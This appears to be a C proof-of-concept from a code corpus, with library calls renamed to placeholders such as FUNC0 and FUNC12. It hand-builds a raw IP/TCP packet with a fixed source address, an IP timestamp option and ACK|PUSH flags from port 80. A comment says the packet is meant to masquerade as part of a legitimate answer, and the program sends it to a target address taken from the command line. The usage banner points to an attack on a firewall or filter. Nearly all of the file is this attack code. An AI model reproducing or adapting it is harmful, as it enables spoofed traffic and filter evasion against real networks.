#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct tcphdr {int th_dport; int th_seq; int th_ack; int th_off; int th_flags; int th_sum; void* th_win; void* th_sport; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct ip {int ip_v; int ip_hl; int ip_tos; int ip_off; int ip_ttl; TYPE_1__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; scalar_t__ ip_p; void* ip_id; void* ip_len; } ;

/* Variables and functions */
 scalar_t__ IPPROTO_TCP ; 
 int IP_SZ ; 
 int LEN ; 
 int OPTSIZE ; 
 int PAYLOAD_LEN ; 
 int /*<<< orphan*/  SRC_IP ; 
 int TCP_SZ ; 
 int TH_ACK ; 
 int TH_PUSH ; 
 unsigned long FUNC0 (int) ; 
 void* FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 char* FUNC3 (TYPE_1__) ; 
 unsigned char* FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (void*,void*,int) ; 
 int /*<<< orphan*/  FUNC6 (unsigned char*,int,int) ; 
 int FUNC7 (scalar_t__) ; 
 void FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 

int FUNC10(int argc, char *argv[])
{
  int FUNC11(unsigned short *, int);
  int FUNC12(void);
  int FUNC13(int, unsigned char *, int);
  unsigned long option = FUNC0(0x44000001);  /* Timestamp, NOP, END */
  unsigned char *p;
  int s, c;
  struct ip *ip;
  struct tcphdr *tcp;

  if (argc != 2) {
    FUNC9("Quid custodiet ipsos custodes?\n");
    FUNC9("Usage: %s <destination IP>\n", argv[0]);
    return;
  }

  p = FUNC4(1500);
  FUNC6(p, 0x00, 1500);

  if ((s = FUNC12()) < 0)
     return FUNC8("socket");

  ip = (struct ip *) p;
  ip->ip_v    = 0x4;
  ip->ip_hl   = 0x5 + (OPTSIZE / 4);
  ip->ip_tos  = 0x32;
  ip->ip_len  = FUNC1(LEN);
  ip->ip_id   = FUNC1(0xbeef);
  ip->ip_off  = 0x0;
  ip->ip_ttl  = 0xff;
  ip->ip_p    = IPPROTO_TCP;
  ip->ip_sum  = 0;
  ip->ip_src.s_addr = SRC_IP;
  ip->ip_dst.s_addr = FUNC2(argv[1]);


  /* Masquerade the packet as part of a legitimate answer */
  tcp = (struct tcphdr *) (p + IP_SZ + OPTSIZE);
  tcp->th_sport   = FUNC1(80);
  tcp->th_dport   = 0xbeef;
  tcp->th_seq     = 0x12345678;
  tcp->th_ack     = 0x87654321;
  tcp->th_off     = 5;
  tcp->th_flags   = TH_ACK | TH_PUSH;
  tcp->th_win     = FUNC1(8192);
  tcp->th_sum     = 0;

  /* Set the IP options */
  FUNC5((void *) (p + IP_SZ), (void *) &option, OPTSIZE);


  c =  FUNC11((unsigned short *) &(ip->ip_src), 8)
     + FUNC11((unsigned short *) tcp, TCP_SZ + PAYLOAD_LEN)
     + FUNC7(IPPROTO_TCP + TCP_SZ);
  while (c >> 16)   c = (c & 0xffff) + (c >> 16);
  tcp->th_sum = ~c;

  FUNC9("Sending %s -> ", FUNC3(ip->ip_src));
  FUNC9("%s\n", FUNC3(ip->ip_dst));

  if (FUNC13(s, p, LEN) != LEN)
     FUNC8("sendto");
}